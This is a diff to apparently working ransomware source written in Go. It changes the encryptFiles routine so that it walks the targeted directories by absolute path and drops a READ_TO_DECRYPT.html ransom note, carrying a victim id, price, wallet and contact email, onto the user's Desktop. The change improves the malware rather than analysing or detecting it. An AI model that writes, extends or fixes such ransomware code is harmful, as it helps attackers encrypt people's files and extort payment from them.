@@ -128,8 +128,7 @@ func encryptFiles() {
 		defer wg.Done()
 
 		// Loop over the interesting directories
-		for _, f := range cmd.InterestingDirs {
-			folder := cmd.BaseDir + f
+		for _, folder := range cmd.InterestingDirs {
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
 				ext := filepath.Ext(path)
 
@@ -247,7 +246,7 @@ func encryptFiles() {
 	content := []byte(fmt.Sprintf(message, keys["id"], cmd.Price, cmd.Wallet, cmd.ContactEmail))
 
 	// Write the READ_TO_DECRYPT on Desktop
-	ioutil.WriteFile(cmd.BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
+	ioutil.WriteFile(cmd.UserDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
 
 	log.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
 }
